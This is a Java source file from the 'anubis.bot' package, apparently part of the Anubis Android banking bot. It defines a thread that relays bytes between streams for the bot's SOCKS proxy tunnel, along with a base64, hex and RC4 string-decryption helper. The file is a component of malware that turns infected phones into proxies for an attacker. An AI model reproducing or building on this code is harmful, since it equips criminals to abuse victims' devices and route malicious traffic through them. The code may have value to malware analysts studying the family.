package anubis.bot.myapplication.socks;

import android.util.Base64;

import java.io.InputStream;
import java.io.OutputStream;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class SocksResponseThread extends Thread {

    private InputStream in;
    private OutputStream out;
    private int BUFF_SIZE = 1024 * 100;
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    public SocksResponseThread(InputStream in, OutputStream out) {
        this.in = in;
        this.out = out;
    }

    @Override
    public void run() {
        int readbytes = 0;
        byte buf[] = new byte[BUFF_SIZE];
        while (true) {
            try {
                if (readbytes == -1) break;
                readbytes = in.read(buf, 0, BUFF_SIZE);
                if (readbytes > 0) {
                    out.write(buf, 0, readbytes);
                }
                out.flush();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}
